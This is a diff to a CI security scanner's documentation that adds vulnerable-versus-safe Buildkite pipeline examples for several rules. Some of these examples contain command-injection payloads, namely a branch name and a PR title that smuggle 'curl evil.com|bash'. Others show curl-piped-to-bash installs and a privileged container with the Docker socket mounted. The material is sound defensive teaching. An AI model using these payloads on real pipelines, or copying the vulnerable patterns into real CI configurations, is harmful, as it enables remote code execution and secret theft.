@@ -2594,6 +2594,30 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Recommendation.** Pin every plugin reference to an exact tag (``docker-compose#v4.13.0``) or a 40-char commit SHA. Bare references (``docker-compose``), branch refs (``#main`` / ``#master``), and major-only floats (``#v4``) resolve to whatever is current at agent start time, which lets a compromised plugin release execute inside the pipeline.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker-compose#main`` resolves at agent
+# boot to whatever sits at the plugin repo's main branch.
+# A push to the plugin repo (legitimate maintainer commit,
+# leaked token, takeover) ships code into every Buildkite
+# job that uses the plugin.
+steps:
+  - label: ":docker: build"
+    plugins:
+      - docker-compose#main:
+          run: app
+
+# Safe: pin to a release tag (or a 40-char commit SHA).
+# Renovate / Dependabot's buildkite-plugin ecosystem bumps
+# these in reviewable PRs so the pin doesn't drift.
+steps:
+  - label: ":docker: build"
+    plugins:
+      - docker-compose#v4.13.0:
+          run: app
+```
+
 **Source:** [`BK-001`](../providers/buildkite.md#bk-001) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `BK-002`: Literal secret value in pipeline env block <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-002 }
@@ -2610,6 +2634,34 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 - Names that imply a secret but actually store a non-sensitive identifier flag here: ``CACHE_KEY: build-2024-Q4``, ``API_KEY_PATH: /var/run/secrets/api``, ``SECRET_NAME: my-vault-secret``. The rule has no way to tell from the name + literal alone whether the value is the credential or merely a reference to one. Also: deliberate test fixtures and documentation snippets that embed canonical example values (``AKIAIOSFODNN7EXAMPLE``) match the strong-pattern set; this is intentional, real-world copies of those example literals usually mean a docs paste was never substituted.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal lives in
+# ``pipeline.yml``. The file is committed to git, visible
+# to anyone with repo read access, and printed in build
+# logs whenever a step echoes its environment.
+env:
+  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+steps:
+  - command: aws s3 cp build/ s3://bucket/
+
+# Safe: fetch the credential from Secrets Manager at
+# step-runtime via the ``aws-ssm`` plugin. The pipeline
+# file references the secret by parameter name; the actual
+# value lives in AWS Secrets Manager and rotates there
+# without a pipeline change.
+steps:
+  - command: aws s3 cp build/ s3://bucket/
+    plugins:
+      - seek-oss/aws-sm#v2.3.0:
+          env:
+            AWS_ACCESS_KEY_ID: /ci/aws/access_key_id
+            AWS_SECRET_ACCESS_KEY: /ci/aws/secret_access_key
+```
+
 **Source:** [`BK-002`](../providers/buildkite.md#bk-002) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `BK-003`: Untrusted Buildkite variable interpolated in command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-003 }
@@ -2624,6 +2676,30 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 - The single-token double-quoted form (``"$BUILDKITE_BRANCH"``) is already excluded; multi-token shell snippets that *look* unquoted but are consumed safely by the downstream tool (e.g. a ``./script.sh $BUILDKITE_BRANCH`` where the script treats argv as data and never re-evaluates) still flag. The rule has no AST-level understanding of the called script, suppress per-step via ``--ignore-file`` once you've verified the script handles untrusted argv safely (or quote the use, which is the better fix).
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an MR whose branch is named
+# ``feat;curl evil.com|bash;#`` lands the metacharacters
+# into the shell verbatim. The injected ``curl`` runs in
+# the build's shell context with the step's full secret
+# set in scope.
+steps:
+  - command: |
+      echo "Building $BUILDKITE_BRANCH"
+      ./build.sh --branch $BUILDKITE_BRANCH
+
+# Safe: assign the untrusted value to a local shell
+# variable, quote it on every use, and pass it as an
+# argument to a script you own. The shell sees one
+# argument; injected metacharacters stay literal.
+steps:
+  - command: |
+      branch="$BUILDKITE_BRANCH"
+      echo "Building $branch"
+      ./build.sh --branch "$branch"
+```
+
 **Source:** [`BK-003`](../providers/buildkite.md#bk-003) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `BK-004`: Remote script piped into shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-004 }
@@ -2636,6 +2712,32 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` trusts both the network path
+# (any MITM substitutes the script) and the host (a
+# compromised installer endpoint silently serves attacker
+# code). The script runs in the build's shell context.
+steps:
+  - label: ":hammer: install tools"
+    command: |
+      curl -fsSL https://installer.example.com/cli.sh | bash
+      ./cli build
+
+# Safe: download to a file, verify a sha256 digest from a
+# trusted source, then execute. If the upstream content
+# changes the digest stops matching and the build fails
+# before the malicious code runs.
+steps:
+  - label: ":hammer: install tools"
+    command: |
+      curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+      echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+      bash /tmp/cli.sh
+      ./cli build
+```
+
 **Source:** [`BK-004`](../providers/buildkite.md#bk-004) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `BK-005`: Container started with --privileged or host-bind escalation <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-005 }
@@ -2647,6 +2749,37 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 **Recommendation.** Drop ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host``, and ``-v /var/run/docker.sock`` from container invocations. If the workload needs Docker-in-Docker, use a build-specific rootless option (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead of opening the host kernel and the agent's Docker socket to the build script.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``--privileged`` plus the host Docker socket
+# gives the build container full access to the agent's
+# kernel and the runtime that started it. A compromise
+# (poisoned base image, RCE in app code) escapes to the
+# agent and from there to every other build sharing the
+# agent.
+steps:
+  - command: ./integration-test.sh
+    plugins:
+      - docker#v5.10.0:
+          image: app@sha256:abc123...
+          privileged: true
+          volumes:
+            - /var/run/docker.sock:/var/run/docker.sock
+
+# Safe: drop ``privileged`` and the socket mount. If the
+# build genuinely needs to build images, use a rootless
+# sandbox (Kaniko, BuildKit rootless, buildah
+# ``--isolation=chroot``) that produces images without
+# host-runtime access.
+steps:
+  - command: ./integration-test.sh
+    plugins:
+      - docker#v5.10.0:
+          image: app@sha256:abc123...
+          privileged: false
+```
 
 **Source:** [`BK-005`](../providers/buildkite.md#bk-005) in the [Buildkite provider](../providers/buildkite.md).
 
@@ -2773,6 +2906,32 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **Known false positives.**
 
 - Some teams use a static prefix plus a CI-controlled tail (``queue: build-$BUILDKITE_PIPELINE_SLUG``) to share an agent pool across pipelines. ``BUILDKITE_PIPELINE_SLUG`` is not pusher-controllable so it isn't on the tainted list, but if your team has its own conventions for trusted Buildkite vars, suppress on the specific step.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``queue: $BUILDKITE_BRANCH`` lets the pusher
+# decide which agent pool runs their step. A PR branch
+# named ``production`` routes its build to the production
+# queue, which typically has elevated permissions (deploy
+# tokens, prod-only secrets) the PR was never meant to
+# reach.
+steps:
+  - label: ":rocket: deploy"
+    command: ./deploy.sh
+    agents:
+      queue: $BUILDKITE_BRANCH
+
+# Safe: pin the queue to a static literal. Production
+# agents should ALSO enforce the queue tag server-side
+# (``buildkite-agent start --tags 'queue=production'``) so
+# the rule is one layer of a defense-in-depth posture.
+steps:
+  - label: ":rocket: deploy"
+    command: ./deploy.sh
+    agents:
+      queue: production
+```
 
 **Source:** [`BK-015`](../providers/buildkite.md#bk-015) in the [Buildkite provider](../providers/buildkite.md).
 
@@ -11592,6 +11751,45 @@ Buildkite meta-data is per-build, not per-step; any step in the same build can r
 **Known false positives.**
 
 - If the producer step runs a sanitiser between the tainted source interpolation and the ``meta-data set`` call (``echo "$BUILDKITE_PULL_REQUEST_TITLE" | tr -dc 'a-zA-Z0-9 ' | xargs -I{} buildkite-agent meta-data set title {}``), the consumer is no longer exploitable but TAINT-005 still fires. Suppress via ignore-file scoped to the consumer step's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a PR titled ``shiny new feature";curl
+# evil.com|bash;"`` lands in the meta-data store via the
+# producer step. The consumer step reads it back into
+# ``$TITLE`` and inlines it into a shell command — the
+# injected ``curl`` runs in the consumer's shell with
+# the consumer step's full secret set in scope.
+steps:
+  - label: extract
+    command: |
+      buildkite-agent meta-data set "title" \
+        "$BUILDKITE_PULL_REQUEST_TITLE"
+  - wait
+  - label: use
+    command: |
+      TITLE=$(buildkite-agent meta-data get title)
+      echo $TITLE
+      ./generate-release-notes.sh --title $TITLE
+
+# Safe: sanitise at the producer (drop anything outside
+# the expected charset) and quote at the consumer. The
+# value is now safe to inline into a shell command — the
+# injected metacharacters either never reach meta-data or
+# are quoted as one literal argument.
+steps:
+  - label: extract
+    command: |
+      clean=$(echo "$BUILDKITE_PULL_REQUEST_TITLE" | \
+          tr -dc 'a-zA-Z0-9 -')
+      buildkite-agent meta-data set "title" "$clean"
+  - wait
+  - label: use
+    command: |
+      TITLE="$(buildkite-agent meta-data get title)"
+      ./generate-release-notes.sh --title "$TITLE"
+```
 
 **Source:** [`TAINT-005`](../providers/buildkite.md#taint-005) in the [Buildkite provider](../providers/buildkite.md).
 
